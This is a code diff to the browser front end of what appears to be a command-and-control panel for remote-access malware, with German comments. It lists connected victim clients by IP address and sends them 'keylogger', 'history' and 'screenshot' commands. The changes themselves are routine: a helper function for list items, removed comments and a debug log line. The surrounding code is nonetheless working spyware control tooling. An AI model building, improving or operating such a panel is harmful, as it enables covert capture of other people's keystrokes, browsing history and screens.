@@ -140,23 +140,28 @@
         output.scrollTop = output.scrollHeight;
       }
 
+      function createClientListItem(client) {
+        const li = document.createElement("li");
+        li.textContent = `ID: ${client.id} (${client.address[0]})`;
+        li.dataset.clientId = client.id; // KORRIGIERT: camelCase
+        if (client.id === selectedClientId) {
+          li.classList.add("selected");
+        }
+        li.addEventListener("click", () => {
+          selectedClientId = client.id;
+          document
+            .querySelectorAll("#client-list li")
+            .forEach((el) => el.classList.remove("selected"));
+          li.classList.add("selected");
+          log(`Client ${selectedClientId} ausgewählt.`, "cmd");
+        });
+        return li;
+      }
+
       function renderClientList(clients) {
         clientList.innerHTML = "";
         clients.forEach((client) => {
-          const li = document.createElement("li");
-          li.textContent = `ID: ${client.id} (${client.address[0]})`;
-          li.dataset.clientId = client.id;
-          if (client.id === selectedClientId) {
-            li.classList.add("selected");
-          }
-          li.addEventListener("click", () => {
-            selectedClientId = client.id;
-            document
-              .querySelectorAll("#client-list li")
-              .forEach((el) => el.classList.remove("selected"));
-            li.classList.add("selected");
-            log(`Client ${selectedClientId} ausgewählt.`, "cmd");
-          });
+          const li = createClientListItem(client);
           clientList.appendChild(li);
         });
       }
@@ -186,13 +191,12 @@
             payload.path = argument;
             break;
           case "history":
-            payload.limit = parseInt(argument) || 20; // Default 20
+            payload.limit = parseInt(argument) || 20;
             break;
           case "keylogger":
-            payload.count = parseInt(argument) || 50; // Default 50
+            payload.count = parseInt(argument) || 50;
             break;
           case "screenshot":
-            // Keine weiteren Argumente nötig
             break;
           default:
             log(
@@ -222,6 +226,7 @@
 
       ws.onmessage = (event) => {
         const data = JSON.parse(event.data);
+        console.log("Empfangen:", data); // DEBUG
 
         switch (data.type) {
           case "client_list":
@@ -229,23 +234,13 @@
             break;
           case "client_connected":
             log(`Neuer Client verbunden: ID ${data.client.id}`);
-            const newClientLi = document.createElement("li");
-            newClientLi.textContent = `ID: ${data.client.id} (${data.client.address[0]})`;
-            newClientLi.dataset.clientId = data.client.id;
-            newClientLi.addEventListener("click", () => {
-              selectedClientId = data.client.id;
-              document
-                .querySelectorAll("#client-list li")
-                .forEach((el) => el.classList.remove("selected"));
-              newClientLi.classList.add("selected");
-              log(`Client ${selectedClientId} ausgewählt.`, "cmd");
-            });
+            const newClientLi = createClientListItem(data.client); // KORRIGIERT
             clientList.appendChild(newClientLi);
             break;
           case "client_disconnected":
             log(`Client ${data.client_id} hat die Verbindung getrennt.`, "error");
             const liToRemove = clientList.querySelector(
-              `li[data-client-id='${data.client_id}']`
+              `li[data-client-id='${data.client_id}']` // KORRIGIERT
             );
             if (liToRemove) liToRemove.remove();
             if (selectedClientId === data.client_id) selectedClientId = null;
